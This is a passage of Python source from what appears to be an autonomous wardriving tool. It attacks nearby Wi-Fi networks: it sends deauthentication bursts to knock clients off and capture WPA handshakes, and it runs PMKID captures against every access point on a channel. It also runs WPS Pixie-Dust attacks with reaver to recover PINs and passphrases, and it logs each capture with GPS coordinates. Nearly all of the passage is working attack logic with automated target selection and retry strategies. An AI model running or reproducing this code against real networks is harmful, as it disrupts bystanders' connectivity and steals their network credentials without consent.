                os.remove(pmkid_file)
                self.stats['handshakes'] += 1
                self.capture_successes += 1
                self.last_handshake_time = time.time()
                self._log_activity('SUCCESS', f"PMKID handshake saved: {ssid}")
                self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                if self.db and hasattr(self.db, 'record_success'):
                    self.db.record_success(bssid)
                if bssid in self.network_knowledge:
                    self.network_knowledge[bssid]['consecutive_failures'] = 0
                if pre_capture_claimed:
                    with self.capture_lock:
                        self.capturing.pop(bssid, None)
                return
            # PMKID failed — fall through to deauth if clients available
        
        # No clients means no deauth target — skip
        if clients == 0 and self.config['wifi']['auto_deauth']:
            self._log_activity('INFO', f"Skipping {ssid} - no clients detected (waiting for activity)")
            if pre_capture_claimed:
                with self.capture_lock:
                    self.capturing.pop(bssid, None)
            return
        
        self._log_activity('TARGET', f"Targeting: {ssid} ({bssid}) on channel {channel}")
        
        # Record attempt in persistent knowledge + band tracking
        self._update_attempted_band(bssid, channel)
        if self.db and hasattr(self.db, 'record_attempt'):
            self.db.record_attempt(bssid, ssid, channel, network.get('encryption', ''))
        if bssid in self.network_knowledge:
            self.network_knowledge[bssid]['total_attempts'] = \
                self.network_knowledge[bssid].get('total_attempts', 0) + 1
            self.network_knowledge[bssid]['last_attempt_time'] = time.time()
        
        # Determine capture strategy based on encryption and failure history
        strategy = 'normal'
        
        # Pure WPA3-only: must use passive (PMF blocks deauth, no WPA2 fallback)
        # Transition mode (WPA2+WPA3): use normal deauth — clients on WPA2 side are vulnerable
        if is_wpa3_only:
            strategy = 'passive'
            self._log_activity('INFO', f"Strategy: passive (pure WPA3 — PMF blocks deauth)")
        elif is_transition_mode:
            self._log_activity('INFO', f"Strategy: normal (WPA2/WPA3 transition — attacking WPA2 side)")
        
        knowledge = self.network_knowledge.get(bssid)
        if strategy == 'normal' and knowledge:
            reason = knowledge.get('last_failure_reason', '')
            consec = knowledge.get('consecutive_failures', 0)
            if reason == 'deauth_failed' and consec >= 2:
                strategy = 'passive'  # Deauth isn't working, try passive-only
                self._log_activity('INFO', f"Strategy: passive (deauth failed {consec}x)")
            elif reason == 'timeout' and consec >= 2:
                strategy = 'extended'  # Give it more time
                self._log_activity('INFO', f"Strategy: extended capture (timed out {consec}x)")

        # Pack coordination: if a peer is already deauthing this BSSID, go passive
        if self._pack_mode and strategy != 'passive':
            for peer_name, peer_info in self._pack_peers.items():
                peer_claims = peer_info.get('deauth_claims', {})
                claim_time = peer_claims.get(bssid)
                if claim_time and (time.time() - float(claim_time)) < 60:
                    strategy = 'passive'
                    self._log_activity('INFO', f"Strategy: passive (pack peer {peer_name} is deauthing {bssid})")
                    break

        # Use parallel capture in dual-mode, otherwise standard capture
        if self.dual_mode:
            capture_thread = threading.Thread(
                target=self._capture_handshake_parallel,
                args=(network, strategy),
                daemon=True
            )
        else:
            capture_thread = threading.Thread(
                target=self._capture_handshake,
                args=(network, strategy),
                daemon=True
            )
        
        with self.capture_lock:
            self.capturing[bssid] = {
                'thread': capture_thread,
                'start_time': time.time(),
                'ssid': ssid,
                'channel': channel
            }
        
        self.capture_attempts += 1
        capture_thread.start()
    
    def _capture_handshake(self, network, strategy='normal'):
        """
        Capture WPA handshake following aircrack-ng best practices:
        1. Lock channel
        2. Start airodump-ng capture (runs entire time)
        3. Send deauth bursts periodically (unless passive strategy)
        4. Check for handshake after each burst
        5. Clean up
        
        Strategies (learned from failure history):
          normal:   Standard deauth + capture (default)
          passive:  No deauth, longer listen window (for deauth-resistant APs)
          extended: Standard deauth but 1.5x capture time (for timeout-prone APs)
        """
        bssid = network['bssid']
        ssid = network['ssid']
        channel = network['channel']
        encryption = network.get('encryption', '').upper()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_prefix = f"/tmp/pawcap_capture_{bssid.replace(':', '')}_{timestamp}"
        
        dump_process = None
        captured = False
        failure_reason = 'timeout'  # Default reason if we reach max_wait
        deauth_successes = 0
        deauth_attempts = 0
        
        try:
            # Step 1: Kill stale processes FIRST, then set channel right before Popen
            if not self.dual_mode:
                self._set_channel(channel)
                self.stats['channel'] = int(channel)
            self._kill_stale_processes(self.capture_interface)
            
            # Set capture channel IMMEDIATELY before Popen — no sleep gap
            if self.dual_mode:
                if not self._set_capture_channel(channel):
                    self._log_activity('ERROR', f"Failed to set {self.capture_interface} to channel {channel} for {ssid}")
                    self.failed_bssids[bssid] = time.time()
                    if self.db and hasattr(self.db, 'record_failure'):
                        self.db.record_failure(bssid, 'process_error')
                    return
            
            # Step 2: Start airodump-ng capture (must run throughout)
            dump_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', output_prefix,
                '--output-format', 'pcap',
                self.capture_interface
            ]
            
            dump_process = subprocess.Popen(
                dump_cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE
            )
            
            # Wait for airodump to initialize and start writing
            time.sleep(3)
            
            # Verify airodump is actually running
            if dump_process.poll() is not None:
                stderr = dump_process.stderr.read().decode('utf-8', errors='ignore').strip()
                self._log_activity('ERROR', f"airodump-ng failed to start for {ssid}: {stderr[:200]}")
                self.failed_bssids[bssid] = time.time()
                if self.db and hasattr(self.db, 'record_failure'):
                    self.db.record_failure(bssid, 'process_error')
                if bssid in self.network_knowledge:
                    self.network_knowledge[bssid]['consecutive_failures'] = \
                        self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                    self.network_knowledge[bssid]['last_failure_reason'] = 'process_error'
                return
            
            # Step 3: Send deauth bursts and check for handshake
            base_max_wait = self.config['capture']['max_capture_time']
            is_pure_wpa3 = 'WPA3' in encryption and 'WPA2' not in encryption
            # Strategy adjustments - normal deauth capped at 60s to cycle faster
            if strategy == 'extended':
                max_wait = int(base_max_wait * 1.5)
            elif strategy == 'passive' and is_pure_wpa3:
                max_wait = min(int(base_max_wait * 5), 600)  # Up to 10min for pure WPA3
            elif strategy == 'passive':
                max_wait = min(int(base_max_wait * 2.5), 300)  # Up to 5min for other passive
            else:
                max_wait = min(base_max_wait, 60)
            use_deauth = self.config['wifi']['auto_deauth'] and strategy != 'passive'
            deauth_interval = 15  # Re-send deauth every 15 seconds
            deauth_count = min(self.config['wifi']['deauth_packets'], 5)  # Cap at 5
            start_time = time.time()
            last_deauth = 0
            last_pcap_size = 0  # Track capture file growth for early-exit
            
            while time.time() - start_time < max_wait and self.running:
                # Abort capture if Find Friends mode activated
                if self._find_friends_mode:
                    self._log_activity('INFO', f"Aborting capture of {ssid} — Find Friends mode active")
                    failure_reason = 'find_friends'
                    break
                
                elapsed = time.time() - start_time
                
                # Watchdog: check if airodump-ng died mid-capture
                if dump_process.poll() is not None:
                    self._log_activity('ERROR', f"airodump-ng died during capture of {ssid}")
                    failure_reason = 'process_crash'
                    break
                
                # Pure WPA3 early-exit: if no traffic after 120s, give up
                # (no point listening for 10min on a dead channel)
                if is_pure_wpa3 and elapsed > 120:
                    pcap_file = f"{output_prefix}-01.cap"
                    try:
                        cur_size = os.path.getsize(pcap_file) if os.path.exists(pcap_file) else 0
                    except OSError:
                        cur_size = 0
                    if cur_size == last_pcap_size and cur_size < 5000:
                        self._log_activity('INFO', f"No WPA3 traffic from {ssid} after {int(elapsed)}s — moving on")
                        failure_reason = 'no_traffic'
                        break
                    last_pcap_size = cur_size
                
                # Send deauth burst periodically (skipped in passive strategy)
                if use_deauth and (elapsed - last_deauth >= deauth_interval or last_deauth == 0):
                    with self.capture_lock:
                        if bssid in self.capturing:
                            self.capturing[bssid]['deauthing'] = True
                    deauth_ok = self._send_deauth(bssid, channel, deauth_count)
                    deauth_attempts += 1
                    if deauth_ok:
                        deauth_successes += 1
                    with self.capture_lock:
                        if bssid in self.capturing:
                            self.capturing[bssid]['deauthing'] = False
                    last_deauth = elapsed
                    # Back off deauth interval after first minute
                    if elapsed > 60:
                        deauth_interval = 30
                
                # Check for handshake frequently
                time.sleep(3)
                
                # Check for handshake in the capture file
                pcap_file = f"{output_prefix}-01.cap"
                if os.path.exists(pcap_file) and self._check_handshake(pcap_file, bssid):
                    self._log_activity('SUCCESS', f"Handshake captured: {ssid}")
                    captured = True
                    self.last_handshake_time = time.time()
                    
                    # Get GPS coordinates
                    gps_data = self.gps.get_current() if self.gps else None
                    
                    # Save to database
                    if self.db:
                        self.db.add_handshake(bssid, ssid, pcap_file, gps_data, channel=channel)
                    
                    # Move capture file to permanent storage
                    dest_dir = self.config['capture']['handshake_dir']
                    os.makedirs(dest_dir, exist_ok=True)
                    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
                    safe_bssid = bssid.replace(':', '')
                    dest_file = os.path.join(dest_dir, f"{safe_ssid}_{safe_bssid}_{timestamp}.cap")
                    
                    shutil.copy2(pcap_file, dest_file)
                    
                    self.stats['handshakes'] += 1
                    self.capture_successes += 1
                    self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                    
                    # Record success in persistent knowledge
                    if self.db and hasattr(self.db, 'record_success'):
                        self.db.record_success(bssid)
                    if bssid in self.network_knowledge:
                        self.network_knowledge[bssid]['consecutive_failures'] = 0
                        self.network_knowledge[bssid]['total_successes'] = \
                            self.network_knowledge[bssid].get('total_successes', 0) + 1
                        self.network_knowledge[bssid]['last_success_time'] = time.time()
                    break
            
            if not captured:
                # Categorize failure reason (don't overwrite if watchdog already set it)
                if failure_reason == 'timeout':
                    if deauth_attempts > 0 and deauth_successes == 0:
                        failure_reason = 'deauth_failed'
                
                strat_note = f", strategy={strategy}" if strategy != 'normal' else ''
                self._log_activity('WARN', f"Capture failed ({failure_reason}{strat_note}): {ssid}")
                self.failed_bssids[bssid] = time.time()
                
                # Record failure in persistent knowledge
                if self.db and hasattr(self.db, 'record_failure'):
                    self.db.record_failure(bssid, failure_reason)
                if bssid in self.network_knowledge:
                    self.network_knowledge[bssid]['consecutive_failures'] = \
                        self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                    self.network_knowledge[bssid]['total_failures'] = \
                        self.network_knowledge[bssid].get('total_failures', 0) + 1
                    self.network_knowledge[bssid]['last_failure_reason'] = failure_reason
            
        except Exception as e:
            self._log_activity('ERROR', f"Error capturing {ssid}: {e}")
            self.failed_bssids[bssid] = time.time()
            if self.db and hasattr(self.db, 'record_failure'):
                self.db.record_failure(bssid, 'process_error')
            if bssid in self.network_knowledge:
                self.network_knowledge[bssid]['consecutive_failures'] = \
                    self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                self.network_knowledge[bssid]['last_failure_reason'] = 'process_error'
        finally:
            # Stop airodump-ng
            if dump_process and dump_process.poll() is None:
                try:
                    dump_process.terminate()
                    dump_process.wait(timeout=5)
                except:
                    try:
                        dump_process.kill()
                    except:
                        pass
            # Clean up any orphaned sudo processes
            self._kill_stale_processes(self.capture_interface)
            
            # Cleanup temp files
            for f in globmod.glob(f"{output_prefix}*"):
                try:
                    os.remove(f)
                except:
                    pass
            
            # Remove from capturing dict
            with self.capture_lock:
                self.capturing.pop(bssid, None)
    
    def _capture_handshake_parallel(self, network, strategy='normal'):
        """Capture handshake using coordinated dual-adapter approach:
           - wlan1 (scan_interface): Sends deauth packets
           - wlan2 (capture_interface): Captures handshake packets
           
        This provides more reliable captures by dedicating each adapter to a specific role.
        """
        bssid = network['bssid']
        ssid = network['ssid']
        channel = network['channel']
        encryption = network.get('encryption', '').upper()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_prefix = f"/tmp/pawcap_capture_{bssid.replace(':', '')}_{timestamp}"
        
        dump_process = None
        captured = False
        failure_reason = 'timeout'
        deauth_successes = 0
        deauth_attempts = 0
        
        try:
            # Step 1: Kill stale processes FIRST, then set channel right before Popen.
            # This eliminates the race window where the 5GHz scanner can change wlan2's
            # channel between our channel set and the airodump-ng Popen.
            self._set_channel(channel)  # wlan1 for deauth
            self.stats['channel'] = int(channel)
            self._kill_stale_processes(self.capture_interface)
            
            # Set channel on wlan2 IMMEDIATELY before Popen — no sleep gap
            if not self._set_capture_channel(channel):
                self._log_activity('ERROR', f"Failed to set {self.capture_interface} to channel {channel} for {ssid}")
                self.failed_bssids[bssid] = time.time()
                if self.db and hasattr(self.db, 'record_failure'):
                    self.db.record_failure(bssid, 'process_error')
                return
            
            # Step 2: Start airodump-ng capture on wlan2 (capture_interface)
            dump_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', output_prefix,
                '--output-format', 'pcap',
                self.capture_interface
            ]
            
            dump_process = subprocess.Popen(
                dump_cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE
            )
            
            # Wait for airodump to initialize
            time.sleep(3)
            
            # Verify airodump is actually running
            if dump_process.poll() is not None:
                stderr = dump_process.stderr.read().decode('utf-8', errors='ignore').strip()
                self._log_activity('ERROR', f"airodump-ng failed to start for {ssid}: {stderr[:200]}")
                self.failed_bssids[bssid] = time.time()
                if self.db and hasattr(self.db, 'record_failure'):
                    self.db.record_failure(bssid, 'process_error')
                if bssid in self.network_knowledge:
                    self.network_knowledge[bssid]['consecutive_failures'] = \
                        self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                    self.network_knowledge[bssid]['last_failure_reason'] = 'process_error'
                return
            
            # Step 3: Send deauth bursts from wlan1 (scan_interface) and check for handshake
            base_max_wait = self.config['capture']['max_capture_time']
            is_pure_wpa3 = 'WPA3' in encryption and 'WPA2' not in encryption
            # Normal deauth capped at 60s to cycle faster
            if strategy == 'extended':
                max_wait = int(base_max_wait * 1.5)
            elif strategy == 'passive' and is_pure_wpa3:
                max_wait = min(int(base_max_wait * 5), 600)  # Up to 10min for pure WPA3
            elif strategy == 'passive':
                max_wait = min(int(base_max_wait * 2.5), 300)  # Up to 5min for other passive
            else:
                max_wait = min(base_max_wait, 60)
            
            use_deauth = self.config['wifi']['auto_deauth'] and strategy != 'passive'
            deauth_interval = 15  # Aggressive early, backs off after 60s
            deauth_count = min(self.config['wifi']['deauth_packets'], 5)  # Cap at 5
            start_time = time.time()
            last_deauth = 0
            last_pcap_size = 0  # Track capture file growth for early-exit
            
            while time.time() - start_time < max_wait and self.running:
                # Abort capture if Find Friends mode activated
                if self._find_friends_mode:
                    self._log_activity('INFO', f"Aborting capture of {ssid} — Find Friends mode active")
                    failure_reason = 'find_friends'
                    break
                
                elapsed = time.time() - start_time
                
                # Watchdog: check if airodump-ng died mid-capture
                if dump_process.poll() is not None:
                    self._log_activity('ERROR', f"airodump-ng died during capture of {ssid}")
                    failure_reason = 'process_crash'
                    break
                
                # Pure WPA3 early-exit: if no traffic after 120s, give up
                if is_pure_wpa3 and elapsed > 120:
                    pcap_file = f"{output_prefix}-01.cap"
                    try:
                        cur_size = os.path.getsize(pcap_file) if os.path.exists(pcap_file) else 0
                    except OSError:
                        cur_size = 0
                    if cur_size == last_pcap_size and cur_size < 5000:
                        self._log_activity('INFO', f"No WPA3 traffic from {ssid} after {int(elapsed)}s — moving on")
                        failure_reason = 'no_traffic'
                        break
                    last_pcap_size = cur_size
                
                # Send deauth burst periodically from wlan1
                if use_deauth and (elapsed - last_deauth >= deauth_interval or last_deauth == 0):
                    with self.capture_lock:
                        if bssid in self.capturing:
                            self.capturing[bssid]['deauthing'] = True
                    
                    # Use scan_interface (wlan1) for deauth
                    deauth_ok = self._send_deauth_on_interface(bssid, channel, deauth_count, self.scan_interface)
                    deauth_attempts += 1
                    if deauth_ok:
                        deauth_successes += 1
                    
                    with self.capture_lock:
                        if bssid in self.capturing:
                            self.capturing[bssid]['deauthing'] = False
                    last_deauth = elapsed
                    # Back off deauth interval after first minute
                    if elapsed > 60:
                        deauth_interval = 30
                
                # Check for handshake frequently
                time.sleep(3)
                
                # Check for handshake in the capture file
                pcap_file = f"{output_prefix}-01.cap"
                if os.path.exists(pcap_file) and self._check_handshake(pcap_file, bssid):
                    self._log_activity('SUCCESS', f"Handshake captured: {ssid}")
                    captured = True
                    self.last_handshake_time = time.time()
                    
                    # Get GPS coordinates
                    gps_data = self.gps.get_current() if self.gps else None
                    
                    # Save to database
                    if self.db:
                        self.db.add_handshake(bssid, ssid, pcap_file, gps_data, channel=channel)
                    
                    # Move capture file to permanent storage
                    dest_dir = self.config['capture']['handshake_dir']
                    os.makedirs(dest_dir, exist_ok=True)
                    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
                    safe_bssid = bssid.replace(':', '')
                    dest_file = os.path.join(dest_dir, f"{safe_ssid}_{safe_bssid}_{timestamp}.cap")
                    
                    shutil.copy2(pcap_file, dest_file)
                    
                    self.stats['handshakes'] += 1
                    self.capture_successes += 1
                    self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                    
                    # Record success in persistent knowledge
                    if self.db and hasattr(self.db, 'record_success'):
                        self.db.record_success(bssid)
                    if bssid in self.network_knowledge:
                        self.network_knowledge[bssid]['consecutive_failures'] = 0
                        self.network_knowledge[bssid]['total_successes'] = \
                            self.network_knowledge[bssid].get('total_successes', 0) + 1
                        self.network_knowledge[bssid]['last_success_time'] = time.time()
                    break
            
            if not captured:
                # Categorize failure reason (don't overwrite if watchdog already set it)
                if failure_reason == 'timeout':
                    if deauth_attempts > 0 and deauth_successes == 0:
                        failure_reason = 'deauth_failed'
                
                strat_note = f", strategy={strategy}" if strategy != 'normal' else ''
                self._log_activity('WARN', f"Capture failed ({failure_reason}{strat_note}): {ssid}")
                self.failed_bssids[bssid] = time.time()
                
                # Record failure in persistent knowledge
                if self.db and hasattr(self.db, 'record_failure'):
                    self.db.record_failure(bssid, failure_reason)
                if bssid in self.network_knowledge:
                    self.network_knowledge[bssid]['consecutive_failures'] = \
                        self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                    self.network_knowledge[bssid]['total_failures'] = \
                        self.network_knowledge[bssid].get('total_failures', 0) + 1
                    self.network_knowledge[bssid]['last_failure_reason'] = failure_reason
            
        except Exception as e:
            self._log_activity('ERROR', f"Error capturing {ssid}: {e}")
            self.failed_bssids[bssid] = time.time()
            if self.db and hasattr(self.db, 'record_failure'):
                self.db.record_failure(bssid, 'process_error')
            if bssid in self.network_knowledge:
                self.network_knowledge[bssid]['consecutive_failures'] = \
                    self.network_knowledge[bssid].get('consecutive_failures', 0) + 1
                self.network_knowledge[bssid]['last_failure_reason'] = 'process_error'
        finally:
            # Stop airodump-ng
            if dump_process and dump_process.poll() is None:
                try:
                    dump_process.terminate()
                    dump_process.wait(timeout=5)
                except:
                    try:
                        dump_process.kill()
                    except:
                        pass
            # Clean up any orphaned sudo processes
            self._kill_stale_processes(self.capture_interface)
            
            # Cleanup temp files
            for f in globmod.glob(f"{output_prefix}*"):
                try:
                    if not captured or not f.endswith('.cap'):
                        os.remove(f)
                except:
                    pass
            
            with self.capture_lock:
                self.capturing.pop(bssid, None)
    
    def _send_deauth_on_interface(self, bssid, channel, count, interface):
        """Send deauth burst using aireplay-ng on specific interface.
        Targets specific client MACs when known, then broadcasts. Returns True on success."""
        if self._find_friends_mode:
            return False
        if self.home_channel and channel == self.home_channel:
            self._log_activity('DEBUG', f"Skipping deauth on home channel {channel} (would disrupt LAN)")
            return False
        try:
            # Get known client MACs for this BSSID
            client_macs = self.seen_networks.get(bssid, {}).get('client_macs', [])
            
            any_success = False
            
            # Target specific clients first (more reliable than broadcast)
            for client_mac in client_macs[:3]:  # Max 3 clients
                self._log_activity('DEAUTH', f"Deauth {count}x to client {client_mac} on {bssid} via {interface}")
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(count),
                    '-a', bssid,
                    '-c', client_mac,
                    interface
                ]
                result = subprocess.run(cmd, capture_output=True, timeout=30, text=True)
                if result.returncode == 0:
                    self.stats['deauths_sent'] += count
                    any_success = True
            
            # Always also send a broadcast deauth
            self._log_activity('DEAUTH', f"Broadcast deauth {count}x to {bssid} via {interface}")
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                interface
            ]
            result = subprocess.run(cmd, capture_output=True, timeout=30, text=True)
            if result.returncode == 0:
                self.stats['deauths_sent'] += count
                any_success = True
            elif not any_success:
                stderr = result.stderr.strip()
                if stderr:
                    self._log_activity('WARN', f"Deauth warning: {stderr[:100]}")
            
            # Record deauth claim for pack coordination
            if any_success:
                self._deauth_claims[bssid] = time.time()
            return any_success
            
        except subprocess.TimeoutExpired:
            self._log_activity('WARN', "Deauth command timed out")
            return False
        except Exception as e:
            self._log_activity('ERROR', f"Deauth failed: {e}")
            return False
    
    def _send_deauth(self, bssid, channel, count):
        """Send deauth burst using aireplay-ng. Returns True on success."""
        if self._find_friends_mode:
            return False
        if self.home_channel and channel == self.home_channel:
            self._log_activity('DEBUG', f"Skipping deauth on home channel {channel} (would disrupt LAN)")
            return False
        try:
            self._log_activity('DEAUTH', f"Sending {count} deauth packets to {bssid} on ch {channel}")
            
            # Broadcast deauth (no -c flag = deauth all clients)
            cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                self.capture_interface
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=30, text=True)
            
            if result.returncode == 0:
                self.stats['deauths_sent'] += count
                # Record deauth claim for pack coordination
                self._deauth_claims[bssid] = time.time()
                return True
            else:
                stderr = result.stderr.strip()
                if stderr:
                    self._log_activity('WARN', f"Deauth warning: {stderr[:100]}")
                return False
            
        except subprocess.TimeoutExpired:
            self._log_activity('WARN', "Deauth command timed out")
            return False
        except Exception as e:
            self._log_activity('ERROR', f"Deauth failed: {e}")
            return False
    
    def _save_bonus_pmkid(self, hash_line, pcapng_file, channel):
        """Save a bonus PMKID/EAPOL capture from a hashcat 22000 format line.
        Format: WPA*02*pmkid*macap*macclient*essid_hex*..."""
        try:
            parts = hash_line.strip().split('*')
            if len(parts) < 6:
                self._log_activity('DEBUG', f"Bonus: hash line too short ({len(parts)} parts)")
                return
            mac_ap = parts[3]  # e.g. '1236aa717e22'
            essid_hex = parts[5]
            try:
                ssid = bytes.fromhex(essid_hex).decode('utf-8', errors='replace')
            except:
                ssid = essid_hex
            bssid_fmt = ':'.join(mac_ap[i:i+2] for i in range(0, 12, 2)).upper()
            
            # Skip whitelisted (protected) networks
            if ssid in self.whitelist:
                self._log_activity('DEBUG', f"Bonus: skipping whitelisted network {ssid}")
                return
            
            # Skip if we already have a handshake for this network
            if self.db and self.db.has_handshake(bssid_fmt):
                self._log_activity('DEBUG', f"Bonus: already have handshake for {ssid} ({bssid_fmt})")
                return
            
            # Save the pcapng (copy — original stays for the primary target)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_ssid = "".join(c for c in ssid if c.isalnum() or c in ('-', '_'))
            dest_dir = self.config['capture']['handshake_dir']
            os.makedirs(dest_dir, exist_ok=True)
            dest_file = os.path.join(dest_dir, f"PMKID_{safe_ssid}_{mac_ap.upper()}_{ts}.pcapng")
            self._log_activity('DEBUG', f"Bonus: copying {pcapng_file} -> {dest_file}")
            shutil.copy2(pcapng_file, dest_file)
            
            gps_data = self.gps.get_current() if self.gps else None
            if self.db:
                self.db.add_handshake(bssid_fmt, ssid, dest_file, gps_data, channel=channel)
            self.stats['handshakes'] += 1
            self.capture_successes += 1
            self.last_handshake_time = time.time()
            self._log_activity('SUCCESS', f"Bonus capture: {ssid} ({bssid_fmt})")
            self._pack_notify_handshake(bssid_fmt, ssid, dest_file, channel)
            if self.db and hasattr(self.db, 'record_success'):
                self.db.record_success(bssid_fmt)
        except Exception as e:
            self._log_activity('WARN', f"Failed to save bonus capture: {e}")

    def _attempt_pmkid(self, bssid, channel, interface):
        """Attempt PMKID/EAPOL capture using hcxdumptool v6.x (no clients needed).
        Runs on the target's channel without BPF filter so hcxdumptool can
        attack all APs on that channel — then checks if the target BSSID
        was captured. Returns path to capture file on success, None on failure."""
        if not shutil.which('hcxdumptool'):
            return None
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_bssid = bssid.replace(':', '')
        outfile = f"/tmp/pawcap_pmkid_{safe_bssid}_{timestamp}.pcapng"
        proc = None
        
        try:
            # hcxdumptool requires setting up its own monitor mode — take interface
            # out of monitor mode first, then let hcxdumptool handle it
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'],
                          capture_output=True, timeout=3)
            subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'type', 'managed'],
                          capture_output=True, timeout=3)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'],
                          capture_output=True, timeout=3)
            
            # Channel notation: hcxdumptool v6.x uses <channel><band>
            # 'a' = 2.4GHz (bg), 'b' = 5GHz (a)
            ch = int(channel)
            chan_arg = f"{ch}a" if ch <= 14 else f"{ch}b"
            
            # No BPF filter — let hcxdumptool attack all APs on this channel.
            # BPF filtering prevents hcxdumptool from completing the association
            # handshake with many APs. We check for our target BSSID afterwards.
            cmd = [
                'sudo', 'hcxdumptool',
                '-i', interface,
                '-w', outfile,
                '-c', chan_arg,
                '--attemptapmax=12',
                '--tot=1',
            ]
            
            self._log_activity('INFO', f"Attempting PMKID capture on {bssid} (ch {chan_arg})")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait up to 70 seconds (--tot=1 minute + margin for startup/shutdown)
            deadline = time.time() + 70
            while time.time() < deadline:
                if proc.poll() is not None:
                    break  # Process exited (--tot timer or error)
                time.sleep(1)
            
            # If still running after timeout, kill it
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except:
                    try:
                        proc.kill()
                        proc.wait(timeout=2)
                    except:
                        pass
            
            # Check if we got PMKID or EAPOL for our target using hcxpcapngtool
            if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
                if shutil.which('hcxpcapngtool'):
                    hashfile = f"/tmp/pawcap_pmkid_{safe_bssid}.22000"
                    check = subprocess.run(
                        ['hcxpcapngtool', '-o', hashfile, outfile],
                        capture_output=True, timeout=10, text=True
                    )
                    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
                        target_mac = safe_bssid.lower()
                        with open(hashfile, 'r') as f:
                            all_hashes = f.read()
                        all_lines = [l for l in all_hashes.strip().split('\n') if l]
                        
                        # Save bonus captures from other APs on this channel
                        bonus_lines = [l for l in all_lines if target_mac not in l]
                        for line in bonus_lines:
                            self._save_bonus_pmkid(line, outfile, channel)
                        
                        if target_mac in all_hashes:
                            self._log_activity('SUCCESS', f"PMKID/EAPOL captured for {bssid}!")
                            if bonus_lines:
                                self._log_activity('INFO', f"Bonus: {len(bonus_lines)} other capture(s) from same channel")
                            os.remove(hashfile)
                            return outfile
                        else:
                            msg = f"hcxdumptool got {len(all_lines)} hash(es) but not target {bssid}"
                            if bonus_lines:
                                msg += f" (saved {len(bonus_lines)} bonus)"
                            self._log_activity('INFO', msg)
                    if os.path.exists(hashfile):
                        os.remove(hashfile)
                    # Log what hcxpcapngtool said for debugging
                    combined = (check.stdout or '') + (check.stderr or '')
                    for line in combined.strip().split('\n'):
                        if any(k in line for k in ['PMKID', 'EAPOL', 'written', 'pairs']):
                            self._log_activity('DEBUG', f"hcxpcapngtool: {line.strip()[:150]}")
                            break
                else:
                    if self._check_handshake(outfile, bssid):
                        return outfile
            
            return None
            
        except Exception as e:
            self._log_activity('WARN', f"PMKID attempt failed: {e}")
            return None
        finally:
            # Kill any lingering hcxdumptool
            if proc and proc.poll() is None:
                try:
                    proc.kill()
                    proc.wait(timeout=2)
                except:
                    pass
            subprocess.run(['sudo', 'pkill', '-f', 'hcxdumptool'],
                          capture_output=True, timeout=3)
            # Restore monitor mode on the interface for airodump-ng
            try:
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'],
                              capture_output=True, timeout=3)
                subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'],
                              capture_output=True, timeout=3)
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'],
                              capture_output=True, timeout=3)
            except:
                pass
            # Clean up empty pcapng
            if os.path.exists(outfile):
                try:
                    if os.path.getsize(outfile) == 0:
                        os.remove(outfile)
                except:
                    pass

    def _attempt_wps_pixie(self, bssid, ssid, channel, interface):
        """Attempt WPS Pixie-Dust attack using reaver.
        Returns (pin, psk) on success, (None, None) on failure."""
        if not shutil.which('reaver'):
            return None, None
        
        try:
            self._kill_stale_processes(interface)
            self._set_channel(int(channel))
            
            cmd = [
                'sudo', 'reaver',
                '-i', interface,
                '-b', bssid,
                '-c', str(channel),
                '-K',       # Pixie-Dust mode
                '-N',       # No NACKs
                '-vv'       # Verbose
            ]
            
            self._log_activity('INFO', f"Running Pixie-Dust on {ssid} ({bssid})")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout + '\n' + result.stderr
            
            # Parse WPS PIN
            pin = None
            pin_match = re.search(r"\[\+\]\s+WPS PIN:\s+'(\d+)'", output)
            if not pin_match:
                pin_match = re.search(r"\[Pixie-Dust\]\s+\[\+\]\s+WPS pin:\s+(\d+)", output)
            if pin_match:
                pin = pin_match.group(1)
            
            # Parse WPA PSK
            psk = None
            psk_match = re.search(r"\[\+\]\s+WPA PSK:\s+'(.+?)'", output)
            if psk_match:
                psk = psk_match.group(1)
            
            # Detect AP lock
            if 'Detected AP rate limiting' in output or 'WPS lockout' in output:
                self._log_activity('WARN', f"WPS locked on {ssid}")
                if bssid in self.wps_networks:
                    self.wps_networks[bssid]['locked'] = True
                    self.wps_networks[bssid]['attempted'] = True
                return None, None
            
            # Detect failure
            if 'WPS pin not found' in output or 'Failed to recover' in output:
                self._log_activity('INFO', f"Pixie-Dust not vulnerable: {ssid}")
                if bssid in self.wps_networks:
                    self.wps_networks[bssid]['attempted'] = True
                    self.wps_networks[bssid]['vulnerable'] = False
                return None, None
            
            if pin:
                # PIN found — try to recover PSK if not already in output
